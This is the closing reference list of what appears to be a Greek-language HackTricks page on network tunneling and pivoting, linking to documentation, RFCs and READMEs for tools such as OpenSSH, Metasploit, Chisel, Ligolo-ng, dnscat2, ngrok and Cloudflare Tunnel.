- [6] [Εγχειρίδιο ssh του OpenBSD](https://man.openbsd.org/ssh)
- [7] [Εγχειρίδιο sshd_config του OpenBSD](https://man.openbsd.org/sshd_config)
- [8] [Σημειώσεις έκδοσης του OpenSSH 9.6](https://www.openssh.org/txt/release-9.6)
- [9] [README του sshuttle](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: Pivoting στο Metasploit](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Τεκμηρίωση του module socks_proxy του Metasploit](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Τεκμηρίωση του module autoroute του Metasploit](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [README του reGeorg](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [README του Chisel](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Οδηγός γρήγορης εκκίνησης του Ligolo-ng](https://docs.ligolo.ng/Quickstart/)
- [18] [Listeners του Ligolo-ng](https://docs.ligolo.ng/Listeners/)
- [19] [Localhost του Ligolo-ng](https://docs.ligolo.ng/Localhost/)
- [20] [README του rpivot](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [Εγχειρίδιο του socat](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [Εγχειρίδιο του PuTTY Plink](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [Επιλογές γραμμής εντολών του PuTTY](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Εντολή portproxy του Microsoft netsh interface](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [README του SocksOverRDP](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Τεκμηρίωση του Proxifier](https://www.proxifier.com/docs/win-v4/)
- [27] [Κανόνες proxification του Proxifier](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [Εγχειρίδιο του OpenVPN 2.7](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [README του YARP](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [README του iodine](https://code.kryo.se/iodine/README.html)
- [32] [README του dnscat2](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [README του dnscat2-powershell](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [README του proxychains-ng](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: Ονόματα τομέων - Υλοποίηση και προδιαγραφή](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [README του ptunnel-ng](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [CLI του ngrok Agent](https://ngrok.com/docs/agent/cli)
- [40] [Διεπαφή επιθεώρησης ιστού του ngrok](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [Virtual hosts του ngrok](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [Ρύθμιση παραμέτρων v2 του ngrok Agent](https://ngrok.com/docs/agent/config/v2)
- [43] [Επισκόπηση του Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/)
- [44] [Παράμετροι origin του Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Ρύθμιση του Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Αρχείο ρυθμίσεων του Cloudflare Tunnel](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Παράμετροι εκτέλεσης του Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [Έννοιες του frp](https://gofrp.org/en/docs/concepts/)
- [49] [XTCP του frp](https://gofrp.org/en/docs/features/xtcp/)
- [50] [SSH Tunnel Gateway του frp](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [Τεκμηρίωση δικτύωσης του QEMU](https://www.qemu.org/docs/master/system/devices/net.html)
- [52] [README του wstunnel](https://github.com/erebe/wstunnel/blob/main/README.md)
- [53] [Αποθετήριο πηγαίου κώδικα του NetSPI BOFScale](https://github.com/NetSPI/BOFscale)
- [54] [BOFScale: Tailnet με CDN front-end από BOF-PE](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
- [55] [Microsoft Learn - Εντολές CLI του Dev Tunnels](https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/cli-commands)
- [56] [V-E-O/rdp2tcp](https://github.com/V-E-O/rdp2tcp)
- [57] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [58] [NightEagle APT: GhostContainer και tunneling](https://securelist.com/tr/nighteagle-apt-ghostcontainer-and-tunneling/121323/)
- [59] [FortiGuard Labs - Το ClingSTUN Linux backdoor καταχράται τη δημόσια υποδομή STUN](https://www.fortinet.com/blog/threat-research/clingstun-linux-backdoor-abuses-public-stun-infrastructure)
- [60] [RFC 8489 - Session Traversal Utilities for NAT (STUN)](https://www.rfc-editor.org/rfc/rfc8489.html)
- [61] [RFC 4787 - Απαιτήσεις συμπεριφοράς NAT για unicast UDP](https://www.rfc-editor.org/rfc/rfc4787.html)
{{#include ../banners/hacktricks-training.md}}
